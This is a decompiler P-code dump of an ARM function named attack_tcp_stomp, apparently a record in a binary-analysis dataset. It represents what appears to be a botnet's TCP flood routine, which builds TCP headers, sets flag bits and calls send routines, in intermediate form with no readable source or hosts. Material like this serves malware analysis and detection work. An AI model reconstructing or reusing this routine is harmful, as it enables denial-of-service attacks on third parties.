Label: 321348292
Function: attack_tcp_stomp
Architecture: arm
Source File: Unknown
Entry Point: 00017e84

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x100003d1, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x10, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x3d, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x9bd, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0x9bd, 4)
(unique, 0x100002bc, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0x0, 4)
(unique, 0x44100, 2) LOAD (const, 0x1a1, 4) , (unique, 0x9180, 4)
(unique, 0x100002c4, 4) PTRADD (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffff9c, 4) , (const, 0x10, 4)
(unique, 0x9180, 4) PTRSUB (unique, 0x100002c4, 4) , (const, 0xe, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (unique, 0x44100, 2)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x9d9, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0x9d9, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0x2, 4)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100002d4, 4) PTRADD (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffff9c, 4) , (const, 0x10, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100002d4, 4) , (const, 0x8, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x28, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0x9f3, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0x9f3, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0x4, 4)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100002e4, 4) PTRADD (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffff9c, 4) , (const, 0x10, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100002e4, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x28, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xa0d, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xa0d, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0x8, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xc, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0x8f, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x80, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x2c, 1)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xa2e, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xa2e, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xc, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(register, 0x2c, 1) INT_OR (unique, 0x43980, 1) , (const, 0x1, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x2c, 1)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xa42, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xa42, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(register, 0x2c, 1) INT_OR (unique, 0x43980, 1) , (const, 0x10, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x2c, 1)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xa56, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xa56, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(register, 0x20, 4) CALL (ram, 0x1cb48, 8)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xa58, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0xa58, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0xa58, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0xa58, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0xa58, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0xa58, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0xa58, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0xa58, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0xa58, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0xa58, 4)
(unique, 0x70f00, 2) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (unique, 0x70f00, 2)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xa72, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xa72, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xe, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffdb, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(unique, 0x10000198, 1) INT_AND (unique, 0x43980, 1) , (const, 0xdf, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x5, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x10000197, 1) , (unique, 0x10000198, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x10000197, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xabf, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xabf, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffda, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(unique, 0x1000019c, 1) INT_AND (unique, 0x43980, 1) , (const, 0xef, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x4, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x1000019b, 1) , (unique, 0x1000019c, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x1000019b, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xb0c, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xb0c, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd9, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(unique, 0x100001a0, 1) INT_AND (unique, 0x43980, 1) , (const, 0xf7, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x3, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x1000019f, 1) , (unique, 0x100001a0, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x1000019f, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xb59, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xb59, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd8, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(unique, 0x100001a4, 1) INT_AND (unique, 0x43980, 1) , (const, 0xfb, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x2, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x100001a3, 1) , (unique, 0x100001a4, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x100001a3, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xba6, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xba6, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd7, 1)
(register, 0x2c, 4) INT_AND (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(unique, 0x100001a8, 1) INT_AND (unique, 0x43980, 1) , (const, 0xfd, 1)
(unique, 0x3580, 4) INT_LEFT (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x70d00, 1) INT_OR (unique, 0x100001a7, 1) , (unique, 0x100001a8, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (unique, 0x70d00, 1)
(unique, 0x100001a7, 1) SUBPIECE (unique, 0x3580, 4) , (const, 0x0, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xbf3, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xbf3, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
(register, 0x24, 1) INT_AND (stack, 0xffffffffffffffd6, 1) , (const, 0x1, 1)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0xfe, 1)
(register, 0x2c, 1) INT_OR (register, 0x24, 1) , (register, 0x2c, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x2c, 1)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xc35, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xc35, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffec, 4) , (const, 0xd, 4)
 ---  CALL (ram, 0x1cc18, 8) , (stack, 0xffffffffffffffa0, 4) , (stack, 0xffffffffffffffd0, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xc3b, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0xc3b, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0xc3b, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0xc3b, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0xc3b, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0xc3b, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0xc3b, 4)
 ---  BRANCH (ram, 0x186f0, 1)
(unique, 0x100001ab, 1) INT_AND (stack, 0xfffffffffffffe99, 1) , (const, 0x1, 1)
(register, 0x65, 1) INT_NOTEQUAL (unique, 0x100001ab, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x186b8, 1) , (register, 0x65, 1)
(unique, 0x100001ac, 1) INT_AND (stack, 0xfffffffffffffe99, 1) , (const, 0x4, 1)
(register, 0x65, 1) INT_NOTEQUAL (unique, 0x100001ac, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x186c4, 1) , (register, 0x65, 1)
 ---  CALL (ram, 0x2991c, 8) , (stack, 0xffffffffffffffb4, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xcad, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0xcad, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0xcad, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (register, 0x2c, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (register, 0x20, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0xcad, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0xcad, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0xcad, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0xcad, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0xcad, 4)
(stack, 0xfffffffffffffe8c, 2) INDIRECT (stack, 0xfffffffffffffe8c, 2) , (const, 0xcad, 4)
(stack, 0xfffffffffffffe99, 1) INDIRECT (stack, 0xfffffffffffffe99, 1) , (const, 0xcad, 4)
 ---  BRANCH (ram, 0x180ac, 1)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4) , (register, 0x2c, 4) , (register, 0x2c, 4)
(register, 0x20, 4) CALL (ram, 0x283ac, 8) , (const, 0x0, 4)
(ram, 0x18930, 4) INDIRECT (ram, 0x18930, 4) , (const, 0xcbc, 4)
(ram, 0x18934, 4) INDIRECT (ram, 0x18934, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffff78, 4) INDIRECT (stack, 0xffffffffffffff78, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffff80, 4) INDIRECT (stack, 0xffffffffffffff80, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffff8c, 2) INDIRECT (stack, 0xffffffffffffff8c, 2) , (const, 0xcbc, 4)
(stack, 0xffffffffffffff8e, 2) INDIRECT (stack, 0xffffffffffffff8e, 2) , (const, 0xcbc, 4)
(stack, 0xffffffffffffff90, 4) INDIRECT (stack, 0xffffffffffffff90, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (register, 0x20, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffcf, 1) INDIRECT (stack, 0xffffffffffffffcf, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffd8, 1) INDIRECT (stack, 0xffffffffffffffd8, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffd9, 1) INDIRECT (stack, 0xffffffffffffffd9, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffde, 1) INDIRECT (stack, 0xffffffffffffffde, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0xcbc, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0xcbc, 4)
